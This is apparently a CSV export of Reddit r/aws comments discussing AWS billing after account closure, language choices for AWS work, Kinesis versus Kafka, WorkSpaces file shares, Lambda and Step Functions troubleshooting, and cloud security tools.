The thing about being billed for services that I cannot change is the part of this situation that I find truly absurd.",13.0
g66tzok,ixgafg,Are you getting billed for services you cannot change or did you lease a car for a year then throw away the keys?,11.0
g66u3jm,ixgafg,Route 53 will renew a domain name unless I log in to prevent it from doing so. I cannot log in because the account is closed. People seem to be really hung up on the reserved instance thing here.,9.0
g66v2hd,ixgafg,[deleted],5.0
g67j9r5,ixgafg,"OP is 100% correct that this Route53 behavior exists.  In our account closing process, we have a step to make sure any Route53 domains are not set to auto-renew before we close out an account.  They will continue to bill you (it's only like $12 but still), but you have no access to your account to shut off.    


Once you close an account, you only have access for a period of time but often the domain renews months after you close it out.  In fact, AWS documents the Route53 scenario - This is less for the OP since it's not intuitive and more for u/jaydeeenn who was questioning it.

[https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/close-account.html#closure-domains](https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/close-account.html#closure-domains)",12.0
g68j71i,ixgafg,"Again AWS offers an array of many complex and powerful services. They are not on the hook for you not understanding the nuances of the technical products you engage with.

What do you think the alternative would look like? You have to manually renew your domain? How many people would lose their domain accidentally just like you kept yours accidentally?

In providing domain services, auto renewing the domain is a clear choice to make in the product offering.",-4.0
g68kulj,ixgafg,"On a closed account? Under what circumstances would anyone want that to happen? This is a bug, plain and simple.",4.0
g68oa4r,ixgafg,"Agreed, the argument that this behaviour is an intentional ""feature"" in the event of a full amount closure is weak to say the least.",1.0
g68u51w,ixgafg,"Im not saying that. AWS hosts thousands of extremely technical functions. Im not saying they couldn't have a better user experience for closing accounts to help you review the dependencies you've created.

However, just because they havent added that additional feature doesn't make it a bug. It isnt a bug, it is a design choice, that makes sense, that then has not been integrated into a feature you as a user want but doesn't even exist yet.

As I've repeated each time. Amazon is not responsible for ensuring you fully understand every technical aspect of the tools they are making available. They have documentation, they have free training courses, and at the end of the day, you are the owner and operator. 

I understand its frustrating when these things happen, but Amazon didn't trick you. You just took on tasks you didn't have a mastery of, and are now learning these nuances.

I get surprises too sometimes, but I also read the documentation for tools before I begin and carefully review how the costs work. Which drastically reduces the risk I take on.

And sure enough it is pretty early on in the Dev Doc, they also email you to in advance this information: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/domain-renew.html",-4.0
g68u8n0,ixgafg,"The lack of a feature is not the existence of a bug.

EDIT: If you had read the dev doc you'd see this clearly stated, and they also email you 45 days before renewing the registration, with info on how to disable it. https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/domain-renew.html",-2.0
g691dcv,ixgafg,"Sounds similar to ""The docs clearly stated that you can't use this product on Wednesdays under a full moon."" If any reasonable person would expect a certain behavior, then different behavior is a bug, not a lacking feature.",1.0
g692iir,ixgafg,"You understand it takes work to create features right. You want every product AWS releases to go through an integration process. That would be cool, but it is a massive effort requiring a whole team and a large amount of coordination. 

AWS is a professional tool. No one went out of their way to trick you. Like all products there is a level between your customers technical skills and the work you put in to aiding them in not needing that mastery. 

Cars don't change their own oil for you. It would be cool if they did, but it isnt a bug that they dont.",-2.0
g693hm7,ixgafg,"I feel like I should clarify that I am not a new AWS user. I'm not a sysadmin, but I've developed two production tools for AWS lambda, and I've used other AWS tools for about a half dozen personal projects.

Nobody would expect their car to change its own oil, but if you told me the engineers hadn't yet finished developing a reverse gear, I'd call that a bug. Just because something is difficult to implement doesn't make it a fun bonus feature.",1.0
_,ixgafg,,
g66seia,ixgafg,"They have everything you mentioned. Unfortunately, as you’ve no doubt gathered AWS alone is complex, and billing even more so. You stumbled on RIs and purchased one. RIs are billed no matter what - you effectively agreed to be billed with or without use for that term. That information also appears on the detailed statements.

If you jump back on AWS I would get very familiar with the Cost Explorer service. It visualizes all of your AWS spend and is really quite good at helping you understand what you’re being billed for. It will even provide a prediction of spend based on the data it has and suggest ways you can save money",4.0
g69r80a,ixgafg,"OP wants to cancel a year long reservation. Yes its unreasonable for OP to get out of paying for 12 months. But for a terminated account, it should be possible to pay those 12 monthly payments *early*. Why would any company not want to get customer money ASAP?",1.0
g69ufvn,ixgafg,"No one is saying these features wouldnt be nice to have. What is being said is the realities of these costs and structures are documented, and you can't expect AWS to operate the way you personally expect it to. If for some reason it stated it worked one way and then in fact worked another way, I'd be with OP. But their frustration stems from a lack of knowledge not anything AWS did.",0.0
g66s84f,ixgafg,"I get your point, but I also understand why it sometimes needs to work that way.

Simplest resolution: cancel the credit card?

Shouldn't be necessary, but might be the simplest way of slaying the babadook (what IS one of those?)",15.0
g6723s1,ixgafg,"Cancelling the card is ridiculous. They should delete all resources when you close the account, and bill you in a final settlement bill. Like every other company",23.0
g67uld1,ixgafg,"While this is crazy annoying and I agree with you that it should be easier to pay off the account when cancelling it, this is a great example of why you NEVER mix work and personal accounts.

The proper procedure here would have been:

- set it up under the company credit card and company name. Never put your personal name on it, even as a contact, unless you are the director of IT

- when you leave, you just leave. Done.

Company doesn't have to deal with all this back and forth with you. They just cancel the account and continue to pay off the remainder of the reserved resources they agreed to, and then the account is done after that.

Can you imagine how much worse this would have been if someone had got access to the account after you left due to reassignment and accidentally left a RDS instance on costing $5000 per month, and you didn't notice for a while because you thought it was closed? And then the company decides they don't want to pay? Why even run the risk?",3.0
g687xv4,ixgafg,"Your story has inspired me to share my ongoing AWS billing story here. About 3 years ago, I was a smartphone owner (I have since rocked a kyocera flip phone but that's another story). On said smartphone I had Google Authenticator which was used for MFA for my AWS account. It was a personal dev environment AWS account with about $45 of recurring monthly usage (I was experimenting with load balancers and ec2 instances for an upcoming AWS certification, I am not using any of these things any more). To make a long story a little shorter... I lost access to this device and have not been able to log into that AWS account to stop billing. I have opened support tickets to try and address this issue with  no luck. Every support person tells me I need to prove that I am the owner of that account by providing proof of address that was listed on the account. I have since moved out of state and previous landlord cannot be reached. So, to this day, I pay AWS about $45 for absolutely nothing. I consider it my part in furthering cloud technology.",3.0
g68o9fq,ixgafg,Just put a stop order with your credit card...,1.0
g68u8gn,ixgafg,"Call me crazy, but when you cancel a service, and you continue getting billed for that service, that's illegal and it's chargeback time. With the reserved instance you agreed to pay so that one's not illegal.",3.0
g67gmds,ixgafg,"You’re waaaaay over thinking this. Call your credit card company and simply tell them to stop auto billing by AWS. This is a permanent solution that does NOT require cancelling your card and will take 5-10 minutes at most.

You’re welcome.",8.0
g678g56,ixgafg,"Closing an account can be very difficult, it's always a PIA.  Any small misstep can render a herd of Babdook (whatever that is).  Just delete everything and pretend it doesn't exist.",2.0
g679god,ixgafg,"I can not speak to the Route 53 issue but for the RI, you can sell it if you still have access to the account.  All you need is a US bank account.",2.0
g69resy,ixgafg,"OP clearly said they don't have access to the account, because its been closed.",0.0
g690dgm,ixgafg,"I had a similar issue where I wasn't using my account and wanted any service that was billing me turned off. Support wanted me to jump through all these hoops, so with my credit card expiring I just bailed on the account all together. They kept emailing me for payment for about a year and eventually gave up.",2.0
g66qcjc,ixgafg,"Why would you use a reserved instance unless you are planning a long-term production workload?

Reserved instances are CONTRACTS. You are signing an agreement to purchase it for that period of time, even if you don't use it.",4.0
g66sdni,ixgafg,"He gets that, he wants to pay all remaining costs now and not have to claim expenses once a month until it's done

Alternately, can't you resell RIs on the marketplace?",10.0
g673x3a,ixgafg,If you have an American bank account. Yes.,1.0
g68xvmp,ixgafg,And I they are non-convertible.,2.0
g66siiv,ixgafg,"Because plans change? I mean that's the reason why every contract I've ever signed has had a termination clause, it's a well-established concept. What point are you trying to make here?",8.0
g6713ex,ixgafg,"sorry to say this but usually what works with customer service is asking for their name and surrname and saying that you will place a complaint on them and the previous agents that didnt help you. really a shady way to do stuff but from my experince if the regular route doesnt help then this route does work 100% times in most customer related scenarios coz it brings enough attention to get the stuff done, which suprisingly should be done within the procedures of the first route. i never did place a complaint on anyone but i do need to get my stuff done so if that what it takes to get stuff done then well.......",-7.0
g66iojt,ixexpb,"Each languages aws sdk models the Restful service endpoints, so they're reasonably interchangeable and this is debate on styles more than anything.

Moving outside aws specifically, you find everything everywhere.  Java/.net lives in enterprises and legacy systems.  Meanwhile node is killing it because one lang for whole stack is nice.  Python glues the rest together, etc...

The modern ecosystem is multi-lingual, so focus more on concepts and being able to adapt to agile environments",10.0
g68vzni,ixexpb,"I agree, 

I went into more detail in another post. But, my experience is that it is easy to go from one language to another when developing on top of AWS if you know the services and APIs.",1.0
g66gi8w,ixexpb,"Python has the boto library which was de facto for a very long time. Now, golang SDK are being used as aws’s source of truth. Tons of devops tools are written in golang so debugging or contributing features would be done in go.

If you’re starting at square zero, golang is what I would go with. Python is a solid choice, but knowing both, I have more fun with golang and my devops org has found it better for development speed (thanks to the package manager natively working with private repositories) and testability",4.0
g675mix,ixexpb,"If you want flexibility between different platforms, Python is going to be a language you can use almost anywhere, and works very nicely with the AWS ecosystem. Node was used this way for a while, but has found its comfortable place in the front-end and isn’t used so much for tooling these days.",4.0
g66g50f,ixexpb,"Or Java?

AWS’s biggest customer is primarily a Java shop.",4.0
g66l5vn,ixexpb,"I can't stand Java, not after working with C#.",4.0
g66mu7g,ixexpb,"Most of the advantages of Go and Python are also the advantages of Java over C#, those being a singular architectural vision and robust open source community support. Are you sure you’re open to a new language?",0.0
g67bz8p,ixexpb,"I totally am, but I have nightmares of dealing with what seemed like an overly difficult experience in getting up and running with Java back in school, as compared to the relative ease of just installing a single Visual Studio IDE and being able to hit the ground running with C# in no time. Not to mention the much cleaner syntax of C#.   It really spoiled me.  From the looks of it, Node and Python are just as clean.",1.0
g67tkvr,ixexpb,"&gt; compared to the relative ease of just installing a single Visual Studio IDE 

LOL...laughed the node.js guy.

It just feels to me that every product MS creates is just the biggest pig when it comes to CPU/memory: IIS, Visual Studio, etc.  They tend to add stuff into their products that account for ***many*** edge cases.  I guess that's part of being so widely adopted.

(Full disclosure, I code node.js in VS Code...which--to me--feels light and nimble compared to full-blown VS)",1.0
g6b09yz,ixexpb,"Memory hog or not, that has nothing to do with what I said, which was the ""ease of setting it up"".  For gosh sakes it tool a whole class to install the Eclipse IDE and all the various external modules that Java required.   You want web services?  That's one module.  You want to debug it locally,?  That's another module.  You want authenticatuon?  That's yet another module. 

And speaking of a memory hog once you finally got everything working together, it was slow as shit.

Visual Studio is literally a single install that gets you everything you need and then some, within like 10 minutes.",1.0
g66lgzg,ixexpb,"If you're after the best language to use with the AWS SDK, then I'd choose Go.

If you're after a language that will pay well, that's going to vary by area.  You're really best to just do a survey of jobs advertised near you and go with that.",1.0
g670q66,ixexpb,"Go and Python are definitely the top two in the age of Cloud and Kubernetes.

In my company, we tend to use Python for deployment-time automation, where we run from Jenkins/GoCD/Gitlab and want to develop alongside puppet/chef/ansible, cloudformation/terraform (all interpreted languages/configs), etc.. For runtime automation, where SLAs come into play, then we switch to Go.   I find that this also helps to maintain a layered approach, with a more natural separation between the base platform and the application layers developing across team members.

Putting on a hiring manager hat, I would be wary of a Go programmer who couldn't code Python, but less so the other way around (but I would expect more of a system engineering or CI/CD background than programming, then).  But I hire for infrastructure automation roles first and foremost.

I would stay far away from anyone who did deployment automation in Java/C# without a very good reason.",6.0
g69eqgj,ixexpb,"I'm pretty much going to agree with everything you've written, especially the last line. :D 

We're finding ourselves replacing Python/Bash with Go in more places.  Not completely, but certainly with parts of the systems that are interacting with or orchestrating AWS. I guess I was responding to the OPs question in terms of languages for building products within the cloud (APIs/workers/etc), but for orchestration/automation/glue code I'd definitely agree that Python is something you should know.",1.0
g67pzaa,ixexpb,Python and golang.,1.0
g68p1td,ixexpb,"For App Development? Node/Typescript

That was surprising to learn but node/typescript is becoming a bigger deal. I do DevOps and I've pretty much all but dropped Python and will pick it up again if I need it. My CDK is all in typescript and any lambdas a write (unless someone wants me to use something else) will be Typescript/Node.

I know that node is pretty popular. .NET core surprisingly in quite a few projects as well.

For me personally I will be going further into Typescript and also Go. I see a bright future for Go.",1.0
g68vrhx,ixexpb,"Disclaimer: I am a consultant at AWS.  My opinions are my own. 

I came from a heavy C# background - over a decade. I just learned Python two years ago before coming to AWS. You almost have to know Python to get a job dealing with AWS. 

It is the go to language for scripting and as a “glue” language. Javascript/Node is also popular. Those are definitely the two most popular  languages for Lambda. 

Then there is the next tier for “real programming”. C# and Visual Studio are  very well supported by AWS. But, I worked for seemingly one of the few companies that wanted C#+AWS experience instead of Java+AWS. 

As far as the SDKs, there is a tool somewhere inside AWS (from watching the reInvent videos) where the service team just defines the API in a standard format and the SDKs and CLI are auto generated. All of the supported languages from my experience get updated simultaneously.",1.0
g69j7i1,ixexpb,"I have similar background as you, been working as a .NET dev for quite some time. At some point in my project we started introducing cloud to some of our apps. It started with RDS, then we started to write lambdas in .net core (that's when my love for cloud started ;) ) and in some time we went 100% cloud.

I slowly changed from a .NET dev to first a devops focused developer and then full fledged devops. I'd say .NET is the context of cloud can be used only as a ""client"" - what I mean here is that you can run C# apps on lambda functions, on ECS or AWS Batch but you won't really use anything from Microsoft to actually communicate with AWS, it's just to cumbersome to do with languages like C# (but the same goes to Java and in my opinion JS as well).

I found python to be most friendly to swich over (and GO wasn't as popular then), you'll need to get used to couple things (whitespace and tabs being a important thing was the hardest thing for me :D), but you should be fine. I found that the devops coding is usually a bit simpler and more straight forward then backend code (the complexity just lies elsewere) so switching to another language shouldn't be too hard. 

Good luck!",1.0
g6b0tj2,ixexpb,Do you still do a lot of coding in your DevOps role?  Is DevOps pay on par with a senior software engineer?,1.0
g6il44e,ixexpb,"I do some coding, but less then I did on my developer position. And it's a infrastructure code (IaC, so a lot of python and CF).

As for the salary - mine didn't really change. But I assume it depends, some places you will get more money doing devops/cloud stuff, somewhere a .net developer will earn more ;)",1.0
g66brj7,ixe4up,"Kinesis data streams are marketed as aws’s kafka service. 

Kinesis itself is like 3 separate services really in kinesis data streams (the one you are talking about), kinesis firehose, and kinesis data analytic",3.0
g66ff93,ixe4up,"thanks, I have edited my question for clarity. I meant AWS Kinesis or AWS EventBridge VS Apache Kafka Cluster.",1.0
g66bhfe,ixe4up,"Kinesis is more directly the comparable product. The difference is primarily that Kinesis is a “serverless” bus where you’re just paying for the data volume that you pump through it. The managed Kafka service (MSK) is just AWS helping take some of the infrastructure overhead away from managing a Kafka cluster yourself. You still have to pay hourly charges for the instances you use, size them correctly for your usage patterns, and generally understand the nuances of how a Kafka cluster is configured. It’s somewhat similar to Kubernetes in that regard, compared to the simpler ECS Fargate service. 

EventBridge is essentially a re-imagined version of CloudWatch Events and it is intended to orchestrate event-driven workflows between different AWS services and/or third party consumers. If you were to send a high volume of custom messages through it constantly, it could start to get more expensive than the others.",2.0
g66f7ds,ixe4up,"thanks, I have edited my question for clarity, should have been clearer from beginning. I meant AWS products (Kinesis, EventBridge) VS Apache Kafka Cluster (non AWS).",1.0
g665v3p,ixbqpv,"Yes. This is a pretty standard use pattern. WorkSpaces have ENIs in your VPC, so you can setup connectivity to any instances you want based on VPC assignment and Security Groups. If you are just looking to serve files, you may also want to look at AWS FSx. It's a managed service for Windows fileshares.",6.0
g66d89q,ixbqpv,thanks for adding your valuable input.since the the app i am testing is a 32/64 bit windows installer app i want to make sure i can just add a shared drive so the app data can sit on the mapped drive,1.0
g666b2g,ixbqpv,"I think I've done this about 2-3 times per month for the last 4 years of my life. Pretty easy to set up, and there may be ways to do this even easier with things like FSx For Windows and a small Managed AD instance as well. This is probably the easiest way to get started with testing, as a lot of the bits are built for you.

If you are just looking to test things out, there's a pretty good Best Practices guide for Workspaces, and adding FSx For Windows on top of that isn't too hard, it you can build your own Windows File Share fairly easily as well.

Best Practices Guide: https://d1.awsstatic.com/whitepapers/workspaces/Best_Practices_for_Deploying_Amazon_WorkSpaces.pdf

Edit: If you are just looking to add a simple file sharing capability, WorkDocs is included with the cost of Workspaces up to 50GB, and might fit your needs easily.",2.0
g66d5fj,ixbqpv,thanks for your valuable input. since the the app i am testing is a 32/64 bit windows installer app i want to make sure i can just add a shared drive so the app data can sit on the mapped drive and run the app off my workspace,1.0
g66dz5r,ixbqpv,"As long as the app runs in the user context, the drive from WorkDocs should work without issue. It'll likely mount as a W: Drive, but if not, the windows share (FSx For Windows or regular Windows Share, whichever) will work, as it's just Windows at the end of the day.",1.0
g66kkbv,ixbqpv,yes that workspace sharing might work for my testing as well. i only need maybe 5 gigs at most since i am only testing installs and creating a few records. a simple peer to peer network would suffice my testing,1.0
g704s0r,ixbqpv,This is just what I was looking for thanks,1.0
g663br8,ixb9vp,"I this an Oracle RDS instance (you mentioned data pump)?  I thought the max EBS size for Oracle RDS was 64TB?

Is the 3.5TB the size of the DB or the size in use on the EBS volume?  Is it possible that you have many dump files taking up space on EBS?  

For Oracle, you can run this to see files stored in the DATA\_PUMP directory:

`select * from table(RDSADMIN.RDS_FILE_UTIL.LISTDIR('DATA_PUMP_DIR'))`  
`where type = 'file'`  
`order by mtime desc;`",3.0
g67lyog,ixb9vp,Something odd but 30 minutes later the export worked. Nothing changed except the AWS storage optimization.,1.0
g68x9lf,ixb9vp,"I mean...'Storage Optimization' means that the storage was increased.  By default, it increases by 10% of the existing volume size.  You said you had a 100TB volume, so it would have increased by 10TB.

Keep digging you may still have a storage issue.

[https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.DBInstance.Status.html](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.DBInstance.Status.html)",1.0
g660irq,ixbu2n,Why did you remove the step shown in the documentation?,1.0
g661ocq,ixbu2n,"It was a 'seed' Lambda function. I also tried to use it but as expected is a lambda function from another account. As far as I can tell, there should be a way to iterate through dynamo and post to sqs",1.0
g6692al,ixbu2n,"The List variable is an output of the step you removed, so the error is telling you it doesn’t exist in the next step. 

Although Step Functions would work, it seems unnecessarily complicated for this. I would just write a Lambda to scan through your table and add messages to SQS. Only hitch would be if your table was too large to scan in 15 minutes, then you’d have to get creative about breaking up the work.",1.0
g66d5lk,ixbu2n,Agreed. Step is used for managing state across (typically serverless) stateless operations. Moving from Dynamo to SQS requires no real state tracking unless you’re talking about bookmarks to split up a large scan or something. Question doesn’t imply the need for Step,1.0
g66m3de,ixbu2n,"You probably don't need step function. Use cw event to trigger a series of lambda that reads a bulk number of rows at a time and move into sqs. You can ""remember"" which one is processed in a separate table or cache.",1.0
g688nsi,ixbu2n,"If you're using DynamoDB as a task scheduler, we built an API for scheduling sqs messages here: 

[https://medium.com/swlh/how-to-get-past-the-15-minute-delay-limit-in-amazon-sqs-fba3c50daf0b?source=friends\_link&amp;sk=f0015b683f9df96e4974bb1c37b2d785](https://medium.com/swlh/how-to-get-past-the-15-minute-delay-limit-in-amazon-sqs-fba3c50daf0b?source=friends_link&amp;sk=f0015b683f9df96e4974bb1c37b2d785)

It's free, and we'd be happy to help you get started. That way you don't have to manage any lambdas, or DynamoDB anymore, and replace it with a clean API call.",1.0
g66lcin,ixafai,[deleted],3.0
g66n2eb,ixafai,"Right, just seems silly that they wouldn't design their own paid security services to be compatible with it. It's gotta be in the roadmap. I guess I'll submit the feature request and see what they have to say...",2.0
g665gnn,ixafai,WorkSpaces is a managed service and leverages ENIs that are not in a VPC you control. So Inspector does not offer much value in conjunction.,2.0
g669f6z,ixafai,Workspaces is a vdi offering that is equally likely to have vulnerabilities as anything is. It can be configured however you want and you can install any software on it. Inspector is the Amazon vuln scanner is it not? It would provide a ton of value.,1.0
g669rej,ixafai,No argument that it could provide value. Workspaces just falls outside of it's current scope as far as I know.,2.0
g66antv,ixafai,:(,1.0
g68qb4t,ixafai,I’ve got a closely related problem. Is there an IAM role attached to the workspaces?,0.0
g65uiic,ixaom3,"What kind of access? What kind of frequency?

Doubting that it’s SSH/RDP, just infrequent access, or both... but if it is, AWS SSM can be a fine, inexpensive alternative.",3.0
g66wvwd,ixaom3,"I usually go with OpenVPN on an EC2 managed through OpsWorks behind an ELB and comnected to AWS AD.


Have a Cloudformation template written for the entire stack here - https://github.com/netbears/opsworks-openvpn


Costs:

- c4.large EC2 - 72 USD/month (on-demand)
- elb in front of it - 20 usd/month
- aws ad - 70 usd/month
- openvpn as license for 10 concurrent users - 15 usd/month


Total cost per month for unlimited traffic for a team of 10 users = 172 usd/month


Benefit - you can reuse aws ad for other auth mechanisms in your infra (eg Grafana, Sentry, etc)",3.0
g65rxmz,ixaom3,"Option (1) is more reliable version of (3); and factor human overhead not worth the fractional pennies.

Option (2) saves a few cents over (1) but requires cross product support.  During live site outage both companies will say it's the other guys fault.",2.0
g660biy,ixaom3,"I’d just spin up a spot EC2, run [Subspace](https://github.com/subspacecloud/subspace) &amp; be done with it.",2.0
g661mc8,ixabet,"I know this is not the question you asked, but don’t write sql like that. You’re headed for a Sql injection attack. Even if you are escaping it. Use a parameterized query. 

But to your question. You don’t need to serialize your response. Just send the response as a Javascript object. Only the body should be serialized.


https://aws.amazon.com/premiumsupport/knowledge-center/malformed-502-api-gateway/

Actually, what does lambdaResponse do?",2.0
g66trkg,ixabet,"Thanks for your answer! I will work on a parameterised query. I'm using API Gateway to handle the different routes on my Lambda functions and `lambdaResponse` is the response to a request on the `/database-manager/create-request` route (imagine Express applied to API Gateway basically).

now I tried returning the JavaScript object, but still not working...  
here's what I did : 

`} else {`  
 `connection.end()`  
 `console.log(""1 record inserted"")`  
`lambdaResponse = {`  
 `""statusCode"": 200,`  
 `""headers"": {},`  
 `""isBase64Encoded"": false,`  
 `""body"": JSON.stringify({message: ""tired of this bs""})`  
`}`  
 `return lambdaResponse`",1.0
g68hdns,ixabet,Notice it isn’t returning the object in the example.  It is calling “callback()” with the response.,1.0
g65sdkb,ixafjf,"Sounds like your function is finishing executing (and hibernating) before your `startExecution` callback is returning.

You probably want to change that to:

    const response = await stepfunctions.startExecution(params).promise()
    ...etc

to be consistent with the `async` handler you've written; I'm not sure how `callbackWaitsForEmptyEventLoop` behaves for `async` handlers...",5.0
g65y40p,ixafjf,That was it!!  Thanks so much!,1.0
g670q5n,ix9ynw,Would love to read an article explaining how you set up the thing in the first place. I've read the Martin Fowler article but haven't found an article on the specifics of implementing it,1.0
g695mxr,ix9ynw,"basically this:

[https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-groups-create-blue-green.html](https://docs.aws.amazon.com/codedeploy/latest/userguide/deployment-groups-create-blue-green.html)",2.0
g65o7uk,ix9o15,"Just check your billing dashboard, it has everything broken down in great detail for you...",10.0
g65qe4b,ix9o15,"Why do people want to keep accounts they're not using? Surely it would be better to delete the account now, and create a new one when you need it so as to get a new Free Tier, and remove all chance of unexpected bills?

You could also use https://github.com/rebuy-de/aws-nuke which gets rid of _most_ AWS resources in an account.",9.0
g65sqmf,ix9o15,This account still has access to other instances via IAM so I can’t delete it. Thanks for the link!,3.0
g65w5so,ix9o15,"In that case, make sure you get the filters right! Make sure you don't nuke your own access in the account, as I often do 😅",2.0
g65lk8u,ix9o15,"if it is that low it isn't something running, do you have any remaining elastic IPs under ec2? 

check the billing dashboard [https://console.aws.amazon.com/billing/home#/](https://console.aws.amazon.com/billing/home#/), should also check the cost and usage reports [https://console.aws.amazon.com/billing/home#/reports](https://console.aws.amazon.com/billing/home#/reports)",8.0
g65n1a2,ix9o15,ty! Managed to find something. It is a forgotten volume in usw2... I deleted it let's see if that lowers the cost...,2.0
g65osk4,ix9o15,"There is another 60p of a charge called ""No Usage Type (*$*)""...

60p is nothing but I don't want to pay a single penny to AWS and Amazon if I'm not using their services...",2.0
g65li77,ix9o15,Also interested. Did some POC work a few months ago. Would be happy to cut the bill out with no resources but keep the account.,2.0
g661124,ix9o15,As mentioned by /u/rowanu just make sure you read the whole readme &amp; not delete your own access https://github.com/rebuy-de/aws-nuke,2.0
g66k5pe,ix9o15,"Check the bills and you'll find exactly what you're beeing charged for. I know it's a bit confusing but it's easier than you think.
Also take a look at other regions and not just the one you're on right now.",2.0
g66vwux,ix9o15,Yes that’s the mistake I did!,1.0
g65r711,ix9o15,Your detailed bill should show it.,1.0
g65s5ux,ix9o15,I saw charges like that for provisioned read/write capacity in ddb. Possibly get rid of tables with provisioned capacity.,1.0
g66m71g,ix9o15,I'll bet $6 that they have itemized the charges.,1.0
g65sn4h,ix9u7k,"ASG works best with gradual ramp up/down not so much ""instantly drop to zero""

For that scenario consider lambda with SQS event source.  It's about as close to instant as it comes",1.0
g65t8jk,ix9u7k,"But its not dropping at all, not even 10-15 minutes. That's what confuses me.",1.0
g65u003,ix9u7k,Should the rule for zero read... When infinity+ &lt;  metric?  Feels like that would always be false,1.0
g66ncyo,ix9j2r,"Well you are in luck because it's just one additional step. Compare that with creating a R53 record which used to take 1 click, but now takes 5.",5.0
g65qsso,ix9j2r,It's dumb. Would love to know their reasoning. My guess is so you are forced to look at the array of services and might see something new.,1.0
g67boio,ix9j2r,"I used to R-click the services and open in new tab. Now I have to L-click, R-click, and then come back to close the services dropdown. I'm not happy either.",1.0
g65x57g,ix99od,"Why do you need to sync the userpool and the database? If you are using Cognito as your authentication mechanism you can get the Cognito UserId and use that as a key in your tables to store retrieve relevant data. 

The connection to Postgres can be made at your application level using generic credentials for all users. 

Does this make sense for your usecase or am I completely misunderstanding your need?",8.0
g667ejr,ix99od,"Additionally, you can add custom attributes on the Cognito User Pool to simplify the model if your use case supports it.",1.0
g67mts8,ix99od,I stay away from custom attributes inside of the pool as you cannot change/delete those after adding them. It’s very clunky. Implemented a nice solution at a client where we used Dynamodb to store custom attributes and used a cognito trigger to execute a lambda that would load the custom attributes as claims in the returned auth token,2.0
g67n0ap,ix99od,Makes sense.,1.0
g696ke8,ix99od,"Late to the comment party ! Agree with Rickety, custom attributes are clunky and when using it in Serverless you have to go additional lengths to ensure they are preserved. 

I have to check out the cognito triggers, have not worked explored that yet.",1.0
g669k8k,ix99od,"This is the same with any federated identity.

Your user arrives with a signed set of claims, one of these is a unique ID. You generally don't store this information (although you may cache it - eg: you may want to keep their name to use in a later batch email process).

You then use this unique ID in your database. Your database will have ""purchases for user ID 3"", ""application preferences for user ID 3""... etc",2.0
g6707ya,ix99od,"Use cognito triggers to enter some cognito data in database and write custom attributes in cognito user to identify user with database tables.

&amp;#x200B;

What we did is use conformation trigger to enter user name and emails in database, once the row is inserted and ID is generated, we write a custom attribute to that user with value of generated ID.

In that way we can have two way connection between DB and Cognito, from DB we can query cognito using user name. And from Cognito Token, we can query user from user id custom attribute.

Another thing: We chose conformation trigger because at that point the user is pretty much committed and verified by AWS, so their email or phone number can be used to communicate with the user. Also you should take the time limit into consideration, if your trigger lambdas does not complete within trigger time limit, all other operations will fail.",2.0
g65hiwq,ix7wki,Have the first script download and run the second one out of an S3 bucket?,4.0
g6bli5v,ix7wki,Is there a method that doesn't rely on S3? Ideally I'd want to make the the instance startup just pure PowerShell without dependencies on other AWS services.,1.0
g6cex6a,ix7wki,"Not that I know of. For Linux instances you can do a multipart user data script but I don’t think EC2config (or whatever it’s called these days) supports that. 

In my case I would be managing the launching the EC2 instance and maintaining the S3 bucket and contents via Terraform or a similar IaC tool.

Another idea would be to bake stuff into the AMI. We do that with Packer hooked into our CI/CD pipeline.",2.0
g65me2m,ix6mrl,"Here is a list of many tools - good luck w/ the Thesis. 

&amp;#x200B;

[https://asecure.cloud/tools/](https://asecure.cloud/tools/)

[https://github.com/toniblyx/my-arsenal-of-aws-security-tools](https://github.com/toniblyx/my-arsenal-of-aws-security-tools)",3.0
g659irq,ix6mrl,"You're likely to run into some boundary trouble; a lot of great tools are highly focused on one area (say, EC2 or S3) rather than a holistic overview.",3.0
g65cypd,ix6mrl,"Hey Corey! Thanks for your response. If the result of my evaluation is that there are no good tools for a complete overview, it‘s also fine. Do you have some tools in mind for the areas you mentioned?",2.0
g65qhkd,ix6mrl,There's also several SIEM (Security Incident Event Management) and APM (Application Performance Management) tools that specialize in cloud -- search Gartner Magic Quadrant.,2.0
g65qqxz,ix6mrl,Wazuh,2.0
g65tfvj,ix6mrl,"We've stitched together a number of open source SecOps tools including Wazuh, Surricata, and ClamAV. Probably all worth looking at.",2.0
g66u1l2,ix6mrl,"Not open-source, but you might be interested by [AWS Config](https://aws.amazon.com/config/) as well.

&gt;AWS Config is a service that enables you to assess, audit, and evaluate  the configurations of your AWS resources. Config continuously monitors  and records your AWS resource configurations and allows you to automate  the evaluation of recorded configurations against desired  configurations.",2.0
g668ogn,ix85cy,Use the SDK?,1.0
g66bmie,ix85cy,Can you elaborate?,1.0
g66gmh6,ix8l52,"One thing to remember when thinking blue/green on Cloudfront is no two cloudfront distributions can have the same ALIAS DNS configured.

If you want to have two cloudfronts and switch blue/green between them, you will need to remove the primary domain name from one CF ALIAS config, then apply to the other.",3.0
g65ym71,ix8l52,you may find this resource helpful.  [https://samswanke.com/2019/10/03/atomic-versioned-deploys-in-s3.html](https://samswanke.com/2019/10/03/atomic-versioned-deploys-in-s3.html),2.0
g6a05cx,ix8l52,"I definitely did! I appreciate the link! This is definitely what I'm trying to achieve and did get part of it working, but my use case is a little bizarre

We have one URL with multiple apps residing as a subdomains:

* [app.example.com/app1/auth/login](https://app.example.com/app1/auth/login)
* app.example.com/app2/auth/login
* app.example.com/app3/auth/login
* app.example.com/app4/auth/login

Where the angular artifacts for each app are stored in a 'folder' with the same name i.e. app1, app2, etc

Currently I have it working with one of the apps but after deploying the artifacts for a second one I'm having trouble getting it to work correctly",1.0
g65zcz9,ix61ho,"i don't have experience with using it, but "" CloudFormer is currently in beta. We recommend against utilizing it in critical or production environments. "" in the docs doesn't provide confidence.",3.0
g67amdo,ix61ho,"AWS have left this in this eternal beta state. How hard would it have been to just build some of those ""guard rails"" they love and make it trigger happy to spit errors at absolutely everything that it can't do perfectly? Then same as everything else release it as a full product and all the bugs are fixed by the paying support customer subsidisy.

If you can cope with ""No news is good news"" and ""CloudFormer is currently in beta"" you will probably be quicker across the finish line. For that project and your current job coincidentally.",1.0
g6629ha,ix61ho,I’ve never had good luck with CloudFormer.,3.0
g66x9xx,ix61ho,"Used CloudFormer to migrate a production account of a Top50 Alexa platform drom one region to another.

